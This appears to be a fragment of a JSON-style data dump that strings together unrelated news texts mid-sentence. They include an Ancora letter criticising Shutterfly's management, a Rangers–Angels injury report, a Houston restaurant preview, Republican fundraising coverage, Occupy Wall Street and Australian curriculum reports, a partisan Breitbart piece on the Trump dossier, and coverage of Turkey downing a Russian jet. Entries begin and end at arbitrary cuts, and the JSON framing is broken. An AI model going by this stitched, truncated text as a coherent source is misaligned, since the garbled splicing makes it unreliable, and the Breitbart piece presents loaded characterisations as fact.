shareholders, particularly considering that we view the Company’s capital allocation track record as questionable. In our valuation work, including stock based compensation as an annual cash cost in a 10 year discounted cash flow of Shutterfly can swing value by over $30 per share, a material impact. We believe that either non-cash compensation needs to be accounted for in the Company’s FCF definition as it is a real ongoing cost that is problematic at Shutterfly, or ideally the entire compensation plan could be reconstructed as outlined above to better align shareholders with management.\n\nFrom January 2011 – December 2014, Shutterfly’s share price appreciated from $38.88 to $41.70, a 19.5% return, or a 4.6% CAGR, which is a return that we think investors should expect from owning a significantly lower risk asset. Over the same time the S&P 500 total return index, which includes dividends, appreciated 76.3% or a 15.2% CAGR. Over this period of dramatic underperformance, Shutterfly reported cumulative stock based compensation of $186.5 million, representing ~15% dilution to shareholders as of January 1, 2011, clearly indicating that compensation is not properly aligned with shareholders return.\n\nPoor capital allocation\n\nWhile we support the recent $300 million buyback authorization, we believe that the Company continues to operate under a sub-optimal capital structure, with limited consideration to optimizing cost of capital. As of March 31, 2015, including cash and investments, Shutterfly was in a net cash position. During the sale process last year, we believe the credit markets were willing to finance approximately 6.0x leverage in a take-private of SFLY. While we believe that leverage at that level would be unreasonable for a public company with the operating profile of Shutterfly, it illustrates the ability for the company to obtain debt financing. We believe a modest 1.5x leverage target (similar to Cimpress’ current leverage) would be extremely reasonable, with excess cash used to repurchase stock. At that leverage, the Company could initially nearly double its repurchase authorization, which would be highly accretive to a company that expects to “grow EBITDA and FCF much faster than revenue” over the medium term. We feel that a long term commitment to returning capital to shareholders via buybacks would also be a strong signal that the Company is committed to more than offsetting the stock-based compensation it believes is required to retain talent in Silicon Valley.\n\nLack of management credibility\n\nManagement has consistently indicated that shareholders would see returns on the Company’s investments in the form of expanding EBITDA margins, as illustrated by a number of recent quotes from senior management:\n\nFebruary 2014: “(we) anticipate the trend of significant investments in our scale and operational infrastructure will moderate in 2015” – Brian Regan, CFO\n\nApril 2014: “what I say to my CMO and my management team is we’re going to keep running the company at a specified EBITDA margin. Any dollars above that, we get to plow back into the business to grow the topline” – Jeff Housenbold, CEO\n\nApril 2014: “So too early to give you guidance exactly where it falls out (for 2015), but we could make this a mid-20’s EBITDA margin model if we wanted to cut back on investments” – Jeff Housenbold, CEO\n\nJuly 2014: “we think that the margins will expand in 2015 from an EBITDA standpoint relative to 2014” – Jeff Housenbold, CEO\n\nFebruary 2015: “We expect that our GAAP operating income will range from approximately $0.5 million to $7.5 million and that our full-year 2015 adjusted EBITDA margin will range from 17.5% to 18.1% of net revenues” – Brian Regan, CFOA\n\nAdjusted EBITDA margins in 2014 were 18.1% (the high end of 2015 guidance after the Company promised expansion), and management introduced a new investment program into Shutterfly 3.0 on the year end 2014 conference call. Management has failed to show the return on investment promised and drive cash flow that they boast the Company can achieve, which reduces their credibility with investors in our minds.\n\nWhile the Company enjoys touting its long term TSR metrics, as we displayed previously, shareholder return since 2011 has lagged significantly. We feel management and the board have failed to recognize that the owners of the business are starved for return on investment via growth of free cash flow driven by the core Shutterfly business and return of capital to shareholders. Shutterfly has successfully built a dominant position in online consumer printing and is positioned to capture an outsized share of consumer printing that is migrating online. While there are undoubtedly investments to be made to defend its leading position and drive growth to the platform, we believe management and the board need to stop running the company as if Mr. Housenbold is the controlling shareholder or founder, and listen to the Company’s owners who are demanding a balance between investing for growth and harvesting previous investments while returning capital to shareholders.\n\nConclusion\n\nAncora urges all Shutterfly shareholders to consider the points in our letter before casting their votes in the upcoming annual meeting of shareholders. We believe that under an improved corporate governance structure, with a dramatically reformed compensation package that forces management to act like owners, and with an improved capital allocation policy, Shutterfly could provide significantly above benchmark returns over the medium and long term. Within this construct, shareholders, management, and the board can all win given alignment of interests. We believe a convincing vote for change in this election will be the impetus needed to begin the transformation required.\n\nAncora Advisors, LLC",

  "latent_5229": "ARLINGTON, Texas -- Texas Rangers starter Yu Darvish left Sunday night's 7-3 victory against the Los Angeles Angels after five innings with a blister on the inside of his right ring finger.\n\nDarvish said following the game that the blister didn't bother him during the start and that he expects to take his next turn in the rotation Friday in Seattle.\n\nAngels starter Jered Weaver, meanwhile, departed in the sixth inning. The All-Star right-hander grabbed his left, non-throwing arm after falling off the mound trying to avoid a batted ball by Mitch Moreland, the first batter of the inning. Manager Mike Scioscia and a trainer immediately came to the mound, and Weaver almost as quickly was walking off it.\n\nThe Angels said Weaver has a strained left elbow. X-rays were negative.\n\nScioscia said after the game that they'll give it a day or two before determining if Weaver can make his next start. The Angels have an off day on Monday, and Weaver said the extra time could help him.\n\n\"I get an extra day, so hopefully that helps out a little bit,\" Weaver (0-1) said after allowing five runs in five innings. \"The trainer said we'll be able tell more in the next couple of days when the swelling goes down. Right now, I don't know. I'm not sure.\"\n\nDarvish also developed a blister during his near-perfect game against the Houston Astros on Tuesday. He pitched the last three innings against the Astros with it, coming within an out of the 24th perfect game in major league history.\n\nDarvish described the ailment more as the skin coming off an area of the finger, although the team termed it a blister.\n\n\"I don't think it's going to affect my start next time,\" Darvish said. \"I just need to prepare my best to start next time.\"\n\nDarvish (2-0) threw 85 pitches against the Angels. He allowed three runs on six hits, four walks and a hit batter to go with six strikeouts.\n\n\"I had trouble with my control,\" Darvish said. \"I made the best of the situation.\"\n\nWeaver, who won 20 games for the first time in his career in 2012, said his elbow feels a little swollen and pretty painful.\n\n\"It feels like a really bad jam, like I jammed it,\" Weaver said. \"I can't move it around too good right now. It's strange. Kind of like jamming your thumb.\n\n\"I didn't feel anything pop or crack. So that's always a good sign. I think it's like when you jam your thumb pretty bad. That's what I'm feeling in my elbow.\"\n\nWeaver slipped on the mound and tried to catch himself as Moreland's line drive whistled over his back for a single. Weaver was replaced by ex-Ranger Mark Lowe, who gave up Ian Kinsler's three-run homer to give Texas a 7-3 lead.\n\nWeaver said trying to do two things at once -- avoid the liner and brace his fall -- isn't the easiest.\n\n\"If I was able to land right, everything would have been fine,\" Weaver said.\n\n\"Knowing that you're falling on the ground and having something come back at you. You're worried about falling down after you slip, then the next thing you know there's a bullet coming back at you.\"\n\nTodd Willis is a contributor to ESPNDallas.com.",
  "latent_5250": "The last six months have been an incredibly dynamic time for Houston restaurants. Simple consider that three of the city’s James Beard Award winners — Chris Shepherd (One Fifth), Hugo Ortega (Xochi), and Justin Yu (Better Luck Tomorrow) — have all opened new projects.\n\nSpurred on by the Super Bowl, the area around Discovery Green has been transformed with new arrivals like Brasserie du Parc, Bayou & Bottle, three new openings in the Marriott Marquis, and three more in the George R. Brown Convention Center. Closer to the Galleria, Yauatcha and Bosscat Kitchen have joined the restaurants in River Oaks District to make the area one of the city’s dining hotspots.\n\nOf course, the Heights and its adjacent neighborhoods remain popular, too. A few prominent closings haven’t overshadowed new arrivals like Presidio, Field & Tides, Helen in the Heights, Star Fish, Heights Bier Garten, King’s BierHaus, and gelato shop Dolce Neve.\n\nThat’s a lot of new restaurants, and it doesn’t even include the never-ending stream of poke shops or interesting activity happening in the suburbs.\n\nFor all that activity and its corresponding talk that perhaps Houston has become overheated, restaurateurs continue to open new concepts. The next few months will see a number of new restaurants from both locals looking to expand and out-of-towners who see opportunity in the Bayou City.\n\nWhile other publications may be content to list 10 or 11 new restaurants, we like to dig a little deeper. Even though places that opened last week or this week — including Chapman & Kirby, SeaSide Poke, Balls Out Burger, Smoke N Honey's, Retrospect Coffee Bar, and South Bank Seafood Bar — aren't on the list, these 21 bars, restaurants, and dessert shops should keep readers busy all summer.\n\nNew concepts from local favorites\n\nOxbow 7 and Hoggbird’s\n\n“Elevated bayou cuisine,” that’s how Bryan Caswell (Reef, Little Bigs, El Real Tex-Mex Cafe) describes Oxbow 7, the first chef-driven concept he’s opened since Stella Sola. Located inside downtown’s Le Meridien hotel, expect the restaurant to feature a stylish, Mid-century modern look when it opens in July, and cuisine that draws upon Caswell’s interests as a hunter and fisherman. The new restaurant represents a change on the business side, too; it’s Caswell’s first where his wife Jennifer is a partner and his longtime associate Bill Floyd is not. Hoggbird’s, a rooftop bar located on the hotel’s 23rd story, looks poised to become downtown’s newest hot spot.\n\nTheodore Rex\n\nJustin Yu has been pretty tight-lipped about his plans for the former Oxheart space, but the James Beard Award winner has finally revealed the name: Theodore Rex. Yu confirmed to CultureMap that the restaurant, which will feature a new layout and an a la carte menu, is still on track to open this summer, but he’s not quite ready to discuss what style of food it will serve or when exactly it will open. In the meantime, diners can eat his Party Melt, Not a Pizza, and other bar snacks at Better Luck Tomorrow.\n\nA’Bouzy\n\nFormer Brasserie 19 general manager Shawn Virene is so devoted to champagne that he’s named his River Oaks restaurant after a town in France that’s located in the Champagne region. Virene has promised that A’Bouzy’s list of over 150 sparklers will be “ the best priced and researched” in Houston; given his track record, we believe him. The success of the New American menu of seafood, salads, and steaks will depend on precise execution; hopefully, details will emerge soon and the exact timing of the restaurant’s opening.\n\nEmmaline\n\nLike Virene did at Brasserie 19, Sam Governale built a devoted following during his eight year tenure at Fleming’s, which will certainly attract customers to his new restaurant in the former Teala’s space on West Dallas. The permitting process has pushed Emmaline back to a late summer opening from its original spring target, but work has begun to transform the space with a second-story patio. Meanwhile, Governale and executive chef Dimitri Voutsinas have been popping up at events around town to test out ideas for the restaurant’s menu — which Governale once described as “classic American fare with European refinement” — by serving dishes that range from classic meatballs to olive-stuffed poached halibut with white asparagus. Of course, the wine list will be first-rate.\n\nAlice Blue\n\nRestaurateur Claire Smith has tapped a number of rising stars, including former Down House executive chef Kent Domas and One Fifth veteran Summer Sepeda, to assist with this new concept in the former Shade space. Slated to open later this month, the restaurant’s definition of “contemporary bistro cuisine with a nod to classical European cooking techniques” has taken a little more shape thanks to a preview dinner that included a summer salad of cantaloupe, tomatoes, and herbs, black sea bass, and blueberry panna cotta. Expects details on the wine and cocktails options, created in part by former Public Services general manager Sean Jensen, to emerge soon.\n\nPresent Company\n\nLater this summer, Shawn Bermudez, the Montrose-based entrepreneur behind The Burger Joint, Stone’s Throw, and Boondocks, will open this replacement for his Sunday funday hotspot Royal Oak. As anyone who’s driven past it will notice, the biggest structural change is the addition of a second story patio. Bermudez has politely declined requests for interior renderings or details on the new food and drink menu, but his stylish aesthetic (an underrated aspect of Stone Throw’s success) and attention to detail (one of the reasons The Burger Joint is always so busy) will certainly make the new bar a must-visit destination as soon as it opens.\n\nFielding’s Rooster\n\nRestaurateur Cary Attar will add a third concept to the Fielding’s family with this chicken-oriented spot. Fielding’s Wood Grill, the company’s gourmet burger outpost, already features an excellent roasted bird, and it will be joined by dishes “ranging from coq au vin to chicken tikka masala,” according to Eater Houston. As at both Wood Grill and Fielding’s Local Kitchen & Bar, beverage options will include cocktails, craft beer, and a well-priced wine list.\n\nKulture\n\nWhile almost everything planned for Avenida Houston has opened, diners have yet to experience this new project from The Breakfast Klub owner Marcus Davis. Eventually the restaurant, which explores the cuisines of the African diaspora from the Caribbean to the American South, will makes its debut in the Partnership Tower that sits across the George R. Brown Convention Center.\n\nWhile we wait, it’s worth noting that The Breakfast Klub’s adjacent Signature Cafe is open from 10 am to 2 pm all summer, which should shorten the amount of time people stand around in the heat, and for late night service from 10 pm to 3 am on Friday and Saturday. Scarfing some wings and a waffle after a night of boozing in Midtown sounds very appealing.\n\nThe return of a beloved local institution\n\nCleburne Cafeteria\n\nConstruction continues to rebuild the iconic restaurant, which was destroyed by a fire in April 2016. Owner George Mickelis told TV station ABC13 that the new building will feature a number of improvements when it reopens this summer, including a patio, dinner entrees like steak, and the ability to order beer and wine. Of course, all the classic recipes will remain intact. Best of all, the employees will return, too; they’ve remained on the payroll throughout the rebuilding process.\n\nHeavy hitters with out of town roots\n\nAqui\n\nSpeaking of the mysterious plans of James Beard Award-winning chefs, Austin’s Paul Qui has only been slightly more forthcoming than Yu about his plans for his restaurant that’s coming to lower Westheimer. Chefs Gabe Medina and Nikki Vongthong will oversee the kitchen, and that the menu will feature “wood and wok cooking with a heavy emphasis on meats and seafood,” as well as a raw bar. The building looks to be mostly complete, but no one has so much as hinted at an opening date. Hopefully it won’t be too much longer.\n\nKukuri\n\nThis restaurant that’s slated to open next to Tacodeli may be flying a little under the radar, but sushi lovers will want to keep their eyes on it. A representative tells CultureMap that the owner recruited chef Shimao Ishikawa from New York City’s Michelin-starred Jewel Bako. If the chef’s cuisine is as exacting as the interior details being revealed on the restaurant’s Facebook page, Kukuri won’t stay unknown for long.\n\nRodeo Goat\n\nThe Dallas-based restaurant will join newly opened restaurant/lounge concept Chapman & Kirby and soon-to-open poke shop SeaSide Poke in EaDo’s rapidly emerging East Village development. Rated as one of the burgers in Cowboy Country, the restaurant serves more than 20 burgers, craft beer, and cocktails.\n\nRoka Akor\n\nThe upscale steak and sushi concept with well-regarded locations in Chicago, Scottsdale, and San Francisco finally looks poised to open this month in the River Oaks area inside a new tower at 2929 Wesleyan. Executive chef Ce Bian and sushi chef Mike Lim will lead the restaurant, which is built around a robata grill. Options include hot and cold appetizers, nigiri sushi, and prime steaks, or diners can opt for an omakase tasting menu. An extensive selection of cocktails and a stylish interior should at least ensure diners drift east from the hotspots in River Oaks District to give Roka Akor a shot, but whether it will pack in patrons like Steak 48 and Le Colonial remains to be seen.\n\nTarka Indian Kitchen\n\nThe Austin-based fast casual Indian restaurant will arrive in the Heights on June 14, followed by a location in Spring this fall. Similar in style to Chipotle, diners select a protein and spice level for each item on Tarka’s menu of curries, kabobs, biryanis, and flatbreads. Signature items include pressed naan sandwiches and masala fries. High-quality ingredients, including hormone free chicken and grass-fed lamb, make it an appealing choice for the health-conscious.\n\nSumoMaya Mexican-Asian Kitchen\n\nThe Arizona-based restaurant that fuses Japanese and Mexican flavors remains the last officially confirmed concept coming to River Oaks District. Although it’s been on versions of this list for a while, it finally looks poised for a late summer opening. Soon enough, we’ll all be arguing about the merits of dishes like pork al pastor pad thai and Mexican pho with roasted pasilla chile broth.\n\nPokéworks\n\nThe New York City-based restaurant known for Instagram-friendly poke burritos and authentic Hawaiian flavors is scheduled to arrive in the Chipotle-anchored shopping center on Heights Boulevard just south of I-10 in August or September.\n\nLocal restaurants with new locations\n\nDish Society Memorial\n\nThe casual farm-to-table restaurant will bring its all-day dining, craft beer, and locally-sourced ingredients to Midway’s new mixed-use development in the next couple of months. A fourth location will open in The Heights next year.\n\nBernie’s Burger Bus - The Heights\n\nOnce the final permitting snafus are overcome, the third location of the growing gourmet burger restaurant will makes its debut (hopefully late June or early July). While most of chef-owner Justin Turner’s menu will match the Bellaire and Katy locations, the restaurant’s first location inside the loop will be a slightly more grown-up affair courtesy of a full bar with cocktails and boozy milkshakes.\n\nCloud 10 Creamery\n\nCultureMap Tastemaker Awards Pastry Chef of the Year 2014 Chris Leung will bring his creative ice cream flavors and acclaimed banana split to the Heights Mercantile development this summer.\n\nMelange Creperie\n\nAlso slated for Heights Mercantile, the popular crepe shop will finally have an above ground, brick and mortar home. The 1,400-square-foot restaurant will include a patio and space for private events.",

That would mean quietly ignoring Mr. Trump’s call this month for a 50-state field operation and instead emphasizing congressional districts and swing states that are also Senate and House battlegrounds.\n\n“They can’t do anything publicly — you can’t rebuke your nominee,” said Liam P. Donovan, a former aide to the National Republican Senatorial Committee. “But you could allocate resources to places where it helps up and down the ballot.”\n\nThe difficulty, though, is that as November approaches, the Republican National Committee is more reliant on Mr. Trump for cash than on other recent nominees. Millions of dollars are coming in through a small-donor-focused committee operated jointly with the committee, which is splitting a share of the proceeds with Mr. Trump. Over half the money raised by the Trump campaign and the committee combined in July came from donors giving less than $200, far more than for any recent Republican nominee. (That figure does not include additional small donations raised by a joint fund-raising committee that Mr. Trump’s campaign treasurer controls, which is not required to file disclosures until October.)\n\nThe campaign’s large-dollar fund-raising, also run jointly with the Republican National Committee, yielded $16 million in cash in July, but much of it is reserved under law for party accounts dedicated to the Republican National Convention, legal expenses and expenditures on offices. Despite being able to collect far more from each of the biggest Republican donors under new campaign finance rules passed in 2014, the committee is well off pace from its July fund-raising in 2012, when Mitt Romney was the party’s nominee.",
  "latent_5697": "NEW YORK (Reuters) - Anti-Wall Street protesters claimed victory on Friday when plans to clean the park they occupy were postponed, while police forces in financial capitals around the world braced for a weekend of rallies.\n\nStencils used to paint slogans supporting the Occupy Wall Street movement on shirts, rest on the ground near bottles of spray paint in Zuccotti Park near the financial district of New York October 13, 2011. REUTERS/Lucas Jackson\n\nA planned cleanup of the Lower Manhattan park that has been home to the Occupy Wall Street movement since Sept. 17 was delayed just hours before it was due to begin by Brookfield Office Properties, which manages the publicly accessible park.\n\nThe move averted a possible showdown between police and protesters who viewed the cleanup as a ploy to evict them. Protesters loudly cheered the decision, and several hundred set off marching toward the city’s financial district.\n\nPolice arrested 14 people, but there were no widespread disruptions.\n\n“This development has emboldened the movement and sent a clear message that the power of the people has prevailed against Wall Street,” Occupy Wall Street said in a statement, estimating more than 3,000 people had gathered in the park.\n\nNew York Mayor Michael Bloomberg, in his weekly radio address on Friday, said his office was not involved in the decision to postpone the cleanup.\n\n“My understanding is that Brookfield got lots of calls from many elected officials threatening them and saying, ‘If you don’t stop this, we’ll make your life much more difficult,’” said Bloomberg, who added that he did not know which officials had called the company.\n\nProtesters are upset that the billions of dollars in U.S. bank bailouts doled out during the recession allowed banks to resume earning huge profits while average Americans got scant relief from high unemployment and job insecurity.\n\nThey also argue that the richest 1 percent of Americans do not pay their fair share in taxes.\n\nMany protesters feared the cleaning would be an attempt to shut down the movement that has sparked solidarity protests in other cities. Concerns also abounded about a repeat of the sort of riots that occurred in 1988 when New York police tried to clear another park, Tompkins Square, injuring 44 people.\n\nRATS AND ROACHES?\n\nBloomberg said Brookfield wanted a few more days to try to reach an agreement with the protesters, who have undertaken their own efforts to clear debris from the park.\n\nShould the two sides fail to reach an agreement, Brookfield could again try to clean the park, which Bloomberg said could put police in an even more difficult situation.\n\n“It will be a little harder, I think, at that point in time to provide police protection,” he said.\n\nMeanwhile, authorities in New York, London, Frankfurt, Athens and elsewhere braced for demonstrations on Saturday.\n\nRallies were planned in some 71 countries, according to Occupy Together and United for Global Change.\n\nIn New York, organizers planned demonstrations in Times Square and Washington Square Park. Protesters will also march to JPMorgan Chase bank branch to withdraw their money.\n\n“Its going to be big, its going to be global,” said David Sierra, 23, a carpenter from Queens.\n\nIn Denver, at least 21 people were arrested on Friday and tents were removed from the Occupy Denver protest.\n\nProtesters in New York had spent much of the night tidying the park themselves, clearing away debris in hopes of keeping out Brookfield, a major real estate company that counts Bloomberg’s girlfriend Diana Taylor among its board members.\n\n“We clean up after ourselves. It’s not like there’s rats and roaches running around the park,” said Bailey Bryant, 28, an employee at a Manhattan bank who visits the camp after work and on weekends.",
  "latent_5957": "Interim report of 17 pages instead outlines process being followed to finalise recommendations\n\nThe team reviewing the national school curriculum for the Abbott government has not offered any concrete suggestions for change in its interim report.\n\nThe reviewers, Kevin Donnelly and Ken Wiltshire, instead used their 17-page first report to outline the process they were following to finalise recommendations for the government by 31 July.\n\nThey also emphasised the need to \"get [the national curriculum] right before it is fully implemented across the country\" – tacitly rejecting the view of many educators that the review was premature given the new material was yet to be fully introduced in all states.\n\nThe education minister, Christopher Pyne, triggered a new debate over Australia's culture and history when he launched the review in January, saying it aimed to remove \"partisan bias\" and address concerns the curriculum downplayed \"the legacy of western civilisation\" and the importance of Anzac Day.\n\nBut the interim report did not make specific reference to such aspects of the curriculum, instead stressing the importance of a \"robust, relevant, independent, balanced and up-to-date curriculum\".\n\nThe report, completed at the end of March but released on Tuesday, said the team had received more than 1,500 submissions from \"a broad range of stakeholders\", a sign of the significant community interest in the review.\n\n\"Given that stakeholder consultations are ongoing, this preliminary report will not draw any conclusions about the issues or key messages emerging from these consultations,\" it said.\n\n\"The development of the Australian curriculum has not been without discussion, debate and disagreement. Every citizen of Australia is a stakeholder in this discussion, so it is natural and health for there to be keen debate about the content of the school curriculum.\"\n\nAs of the time of the interim report the reviewers had held four formal panel meetings.\n\nThe Greens claimed credit for the report's release, given a pending Senate order to produce review documents.\n\nThe party's spokeswoman on schools, Penny Wright, said the report reinforced her concerns that the review was hasty and unnecessary and she was not surprised by how little had been achieved by the reviewers.\n\n\"Given the vacuity of this current document, Kevin Donnelly and Ken Wiltshire have essentially only three more months to review six years’ worth of work by hundreds of experts,\" Wright said. \"A report with a poor process like this can have no integrity. Minister Pyne should dump this implausible review.\"\n\nA spokesman for Pyne said the document was a preliminary report to inform the minister on progress.\n\nWiltshire, a conservative commentator whose appointment was controversial given his past strong criticism of the national curriculum, had held \"extensive discussions\" with representatives from the OECD Directorate for Education and Skills, the English Department for Education and UK-based think tanks, the report said.\n\nThe review team was also hiring subject area specialists to evaluate the various areas of the curriculum, the report said. These specialists were being asked to provide advice on the \"comprehensiveness, structure and sequencing\" of the content.\n\nThey would consider how each learning area compared \"with the curriculum of two other relevant countries\".\n\nOne of the questions to be answered was \"whether the curriculum for this learning area encourage a love of learning, a joy of discovery, and a quest for knowledge and related skills\", the report said.\n\nLabor has previously argued the curriculum review was a politically motivated attempt to distract from concerns over the future of needs-based school funding.",
  "latent_6048": "Rosie Gray, an ex-BuzzFeed reporter who now works at The Atlantic magazine, told Breitbart News exclusively that she disagrees with the decision her old editor, BuzzFeed’s Ben Smith, made to run a fake news dossier against President Donald Trump accusing the then-president-elect of having untoward relations with Russia.\n\n“I would not have made that decision to run that,” Gray told Breitbart News on Tuesday when asked if she would have run either the BuzzFeed story containing the dossier or the previous CNN piece on live television and online which aimed to lend credibility to the dossier without actually publishing it. Gray does still consider Smith a mentor and a friend, however.\n\nGray’s decision to speak out publicly against her former employer, BuzzFeed, is noteworthy considering she was one of the top newsroom employees there. She also, in her new capacity as a reporter for The Atlantic, delivered one of the earliest and strongest hammer blows against Smith’s and CNN’s decision to publish the dossier, discrediting BuzzFeed and CNN.\n\n“It Is Fake News Meant to Malign Mr. Trump” read the headline on Gray’s exposé debunking BuzzFeed’s report on a supposed intelligence document alleging a number of salacious things about Trump and his team.\n\n“Michael Cohen, an attorney for the president-elect has denied allegations contained in a dossier published by BuzzFeed News,” Gray’s sub-headline in The Atlantic reads, further blowing up the now-discredited BuzzFeed scoop.\n\nThe document published by her old employer, Gray wrote, “alleges that Michael Cohen, special counsel to Trump, was central to ‘the ongoing secret liaison relationship between the New York tycoon’s campaign and the Russian leadership,’ and that he met secretly with Kremlin officials in Prague in August 2016.”\n\nBut unlike BuzzFeed, which didn’t actually check to verify the allegations before it published the document, Gray actually checked to see if that specific allegation was true or not. And Gray found the first of many holes in BuzzFeed’s report, ripping her old employer’s fake news report to shreds by having made just a few phone calls to see if the allegations in the document were accurate. Gray wrote:\n\nReached by telephone on Tuesday night, Cohen denied the dossier’s allegations. The story is ‘totally fake, totally inaccurate,’ Cohen said. ‘I’m telling you emphatically that I’ve not been to Prague, I’ve never been to Czech [Republic], I’ve not been to Russia,’ Cohen said. ‘The story is completely inaccurate, it is fake news meant to malign Mr. Trump.’ Cohen said that during the time the report places him in Prague, he was actually with his son visiting USC and meeting with the baseball coach.\n\nGray, unlike BuzzFeed, actually called the source of the allegation to ask him if it was true before she printed it. And she called the University of Southern California, too, to verify that claim — and they confirmed it.\n\nGray wrote at her new publication, The Atlantic:\n\nA USC baseball source confirmed Tuesday night that Cohen and his son had visited USC on August 29th. Cohen said that he was in Los Angeles from the 23rd through the 29th of August, and that the rest of the month he was in New York. He said that his only trip to an EU country over the summer had been a vacation to Italy in July. In one instance, the dossier places the alleged Prague travel in ‘August/September 2016.’ Cohen said he was in New York for the entire month of September.\n\nGray is part of a group of discredited ex-BuzzFeed staffers who fled the publication in a recent mass exodus. Andrew Kaczynski, who was a lead researcher for BuzzFeed, went to work for CNN. And McKay Coppins, the largely discredited BuzzFeed scribe who inaccurately profiled Trump before he ran for president in a hit piece claiming Trump would never run for president, joined Gray in traveling to The Atlantic. Among other mistakes that BuzzFeed allowed its reporters to make, Coppins also inaccurately reported the fake news that Breitbart News was funded by Donald Trump during the campaign.\n\nBuzzFeed’s Smith, Gray’s old editor, has not immediately responded to a request for comment on Gray’s decision to admonish her old employer’s irresponsible editorial decision-making.\n\nCNN in many ways was worse than BuzzFeed in what they did on this front: While CNN did not actually publish the document, anchor Jake Tapper and reporters Jim Sciutto, Evan Perez, and Carl Bernstein lent enormous credibility to the source of the document without verifying any of the now discredited allegations.\n\nThe episode resulted in a very public blowup for both CNN and BuzzFeed, as at Trump’s first press conference as president-elect earlier in January he blasted CNN’s Jim Acosta–who broke journalistic norms in his attempts to interrupt the then-president-elect–as working for a “Fake News” outlet. Trump also blasted BuzzFeed as a “failing pile of garbage” during that press conference.\n\nUPDATE 3:10 p.m. ET:\n\nGray confirms publicly she would not have made the same decision as Smith or CNN, but then tries to rationalize it in an unhinged Tweet-storm.\n\nok so, before this becomes a thing, here's what actually happened here 1/ https://t.co/xk20WnGdhk — Rosie Gray (@RosieGray) January 24, 2017\n\n2/ I called Boyle for a story I'm working on.

Putin said it was “obvious” the plane posed no threat to Turkey.\n\nRussian fighter jet downed near Turkey-Syria border – live updates Read more\n\n“Our military is doing heroic work against terrorism … But the loss today is a stab in the back, carried out by the accomplices of terrorists. I can’t describe it in any other way,” he said. Putin suggested the Turks were shielding Islamic State terrorists from Russian attacks, saying: “Do they want to make Nato serve Isis?”\n\nIn Washington, Barack Obama said that Turkey had a right to defend its territory and airspace, but called on all parties to “step back” and ensure the situation does not escalate.\n\nSpeaking at a joint press conference with his French counterpart Francois Hollande, the US president said that the incident underlined the shortcomings of Russia’s operation in Syria. “The problem has been Russia’s focus on propping up Assad rather than concentrating on Isil,” he said, using an alternative name for the Islamic State terror group.\n\n“Russian airstrikes against the moderate opposition only help to bolster Isil. Russia could play a more constructive role it if shifts the focus of its strikes,” he said.\n\nObama and Hollande both repeated calls for Russia to participate in efforts to reach a political solution to the Syrian crisis. “The sooner we agree to a political process, the less likely events like this will be,” Obama said.\n\nAnkara and the Kremlin gave conflicting accounts of the incident, which appears to have occurred in an area near the Turkish-Syrian border straddling Iskenderun and Latakia.\n\nThe Turkish military said it scrambled two F-16 fighter jets after a plane entered Turkish airspace in the province of Hatay at 9.20am on Tuesday, warning it to leave 10 times in five minutes before shooting it down.\n\nA government official said: “In line with the military rules of engagement, the Turkish authorities repeatedly warned an unidentified aircraft that they were 15km or less away from the border. The aircraft didn’t heed the warnings and proceeded to fly over Turkey. The Turkish air forces responded by downing the aircraft.\n\nTurkey caught between aiding Turkmen and economic dependence on Russia Read more\n\n“This isn’t an action against any specific country: our F-16s took necessary steps to defend Turkey’s sovereign territory.”\n\nThe Turkish UN ambassador, Halit Cevik, told the UN Security Council in a letter that two planes had flown a mile into Turkey for 17 seconds. “Following the violation, plane 1 left Turkish national airspace. Plane 2 was fired at while in Turkish national airspace by Turkish F-16s performing air combat patrolling in the area,” he wrote.\n\nRussia’s defence ministry, in a series of tweets, confirmed that a Russian Su-24 had been shot down, but insisted the plane had never left Syrian airspace and claimed that fire from the ground was responsible. “At all times, the Su-24 was exclusively over the territory of Syria,” the defence ministry said.\n\n“The Su-24 was at 6,000 metres and preliminary information suggests it was brought down by fire from the ground. The circumstances are being investigated.”\n\nThe Nato secretary general, Jens Stoltenberg, said the assessments of other members of the alliance supported the Turkish version of events. “We stand in solidarity with Turkey and support the territorial integrity of our Nato ally,” he said.\n\nA US official told Reuters initial indications were the Russian jets had been in Turkish airspace for a matter of seconds.\n\nLate on Tuesday, the Russian defence ministry confirmed that one of the two pilots had died, from “fire from the ground”, RIA Novosti reported. The fate of the second pilot remained unclear. There was a further casualty during the rescue operation around the crash site area in Jabal al-Turkman in Syria’s northern Latakia province to find the two pilots.\n\n“To evacuate the Russian pilots a rescue mission of two Mi-8 helicopters was sent to the spot. During the operation, one of the helicopters was hit by fire from the ground and had to perform an emergency landing. One of the marines died,” Lieutenant General Sergei Rutskoi of the Russian defence ministry told Russian journalists on Tuesday.\n\nThe area near where the plane was shot down is the site of continuing clashes between forces loyal to the embattled Syrian president, Bashar al-Assad, and rebels fighting to overthrow him.\n\nRussia launched a military intervention in October aimed at protecting the areas in western Syria still under control by the regime after nearly five years of civil war. The northern Latakia countryside has seen repeated aerial assaults by both Russian and Syrian air forces.\n\nTensions between Turkey and Russia have risen over Moscow’s bombing campaign against ethnic Turkmens close to the Turkish border. Turkey has repeatedly expressed concern over the attacks on the Turkmens, a Sunni Muslim minority whom many Turks regard as their kith and kin. Like the Ankara government, the Turkmens oppose Assad’s Alawite regime.\n\nShortly after the Russian intervention, Turkey warned the Kremlin that it would not tolerate violations of its airspace, after two incidents that prompted consultations with Nato.\n\nSinan Ülgen, a former Turkish diplomat who is now the chairman of the Edam thinktank in Istanbul, said Tuesday’s incident had been coming for some time.\n\n“There were two airspace violations [in the past few weeks], and after that a very high-level Russian military delegation came to Turkey to talk about it, including a top air force official. They apologised for one of the incidents, saying that in that case the Russian pilot didn’t speak the language. So we thought we had an understanding and solved the problem.\n\n“So it’s a surprise that it happened since that visit,” said Ülgen. “But it’s not a surprise in terms of Russian strategy. Since the intervention the Russians have been testing the Turkish response at its borders and its rules of engagement.\n\n“In this case, the pilot was warned a number of times. First at 13 miles out from the Turkish border, and then at five miles out, which is when Turkish jets scramble. It went past all those thresholds,” he said.\n\nPutin said there would be “serious consequences” for Russia-Turkish relations.\n\n“We have always treated Turkey as a friendly state. I don’t know who was interested in what happened today, certainly not us. And instead of immediately getting in contact with us, as far as we know, the Turkish side immediately turned to their partners from Nato to discuss this incident, as if we shot down their plane and not they ours.”\n\nTurkey opposes Assad and has condemned the Russian intervention for targeting rebels not affiliated with the terror group Islamic State.\n\nThe latest incident highlights the grave risks of clashes of arms between the various international forces that have intervened in Syria. A coalition led by the US is conducting an campaign against Isis in the country, and American and Russian officials have worked on ensuring there are no clashes between their forces as they pursue their separate campaigns.\n\nBut the shooting down of the Russian plane is an escalation that leaves open the possibility of a clash between a Nato member and Russia, whose intervention shows an increasing assertiveness in international affairs.\n\n• This article was amended on 1 February to remove a reference to an “exchange of fire” when the 